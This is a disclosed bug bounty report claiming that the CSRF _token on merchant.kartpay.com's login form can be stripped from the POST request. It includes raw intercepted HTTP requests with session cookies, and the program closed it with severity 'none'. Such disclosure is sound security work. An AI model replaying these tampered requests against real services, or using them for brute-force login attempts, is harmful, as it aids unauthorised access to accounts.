# Bypass _token in forms [Merchant.Kartpay.com ]

## Report Details
- **Report ID**: 642643
- **URL**: https://hackerone.com/reports/642643
- **State**: Closed
- **Severity**: none
- **Submitted**: 2019-07-13T21:45:32.663Z
- **Disclosed**: 2019-10-09T05:34:18.970Z

## Reporter
- **Username**: zxdrrr
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kartpay

## Vulnerability Information
## Summary:
I found a issue in froms related to the Merchant.Kartpay.com domain and it allow to bypassing _token.

## Browsers Verified In:

  *  Firefox 68

## Steps To Reproduce:

  1. Go To Login or any form (https://merchant.kartpay.com/merchant_login)
  2. Fill form and Intercept in burpsuite next click on LOGIN
  3. Request :

```
POST /login HTTP/1.1
Host: merchant.kartpay.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://merchant.kartpay.com/merchant_login
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Connection: close
Cookie: laravel_session=eyJpdiI6ImU3TkIxd21yXC81SE1rNHlSSnExV3JBPT0iLCJ2YWx1ZSI6IkFmYUMrTEJzXC8rM1VoaWVpUldJN1RGV0doUkZPQ09laThzSHo0dEI4cjgraFhsYWJCSThwK3FkYUNnbjA1OXhNIiwibWFjIjoiNWFkY2E4YmVmYzM4NWYwMzAxN2MwMDZiMjg1MTJlYTdjMGExNDMzMmU3MDk3YjRhMTk4OTg4YmMzYzFjMjk4ZSJ9; XSRF-TOKEN=eyJpdiI6Ink5TmNERjF6UHJnV2NuMjQ5dVB2YUE9PSIsInZhbHVlIjoicEI5SFpxZzd3bkhYeDRBZlNyZWRZZWpcL1wvQTkrR1llbENCUExFYmh0Mk9uaXNxSkp4MTg0d2xHM0NYdVVQRk1cLyIsIm1hYyI6ImM4ODFiMzFkZGY5MzBmNDhiNmU0ZGYxODM3YzZiYmQ0Y2E0ZDkwOGY2MWU1Y2U4ZGNmMGY4Yzg5ZGE1MDk1OWMifQ%3D%3D
Upgrade-Insecure-Requests: 1

_token=877NUN0kNyUQUP8aRDpdjbHnHteOKr6PvfxMsbv4&merchant_id=123456789&email=test%40gmail.com&password=P%40ssw0rd
```
Remove _toekn in request like this and forward request:
```
POST /login HTTP/1.1
Host: merchant.kartpay.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://merchant.kartpay.com/merchant_login
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Connection: close
Cookie: laravel_session=eyJpdiI6ImU3TkIxd21yXC81SE1rNHlSSnExV3JBPT0iLCJ2YWx1ZSI6IkFmYUMrTEJzXC8rM1VoaWVpUldJN1RGV0doUkZPQ09laThzSHo0dEI4cjgraFhsYWJCSThwK3FkYUNnbjA1OXhNIiwibWFjIjoiNWFkY2E4YmVmYzM4NWYwMzAxN2MwMDZiMjg1MTJlYTdjMGExNDMzMmU3MDk3YjRhMTk4OTg4YmMzYzFjMjk4ZSJ9; XSRF-TOKEN=eyJpdiI6Ink5TmNERjF6UHJnV2NuMjQ5dVB2YUE9PSIsInZhbHVlIjoicEI5SFpxZzd3bkhYeDRBZlNyZWRZZWpcL1wvQTkrR1llbENCUExFYmh0Mk9uaXNxSkp4MTg0d2xHM0NYdVVQRk1cLyIsIm1hYyI6ImM4ODFiMzFkZGY5MzBmNDhiNmU0ZGYxODM3YzZiYmQ0Y2E0ZDkwOGY2MWU1Y2U4ZGNmMGY4Yzg5ZGE1MDk1OWMifQ%3D%3D
Upgrade-Insecure-Requests: 1

merchant_id=123456789&email=test%40gmail.com&password=P%40ssw0rd
```
request was do successfully.

## Impact

Attacke can bypass _token to do some work like brute force and such as...

## Attachments
No attachments
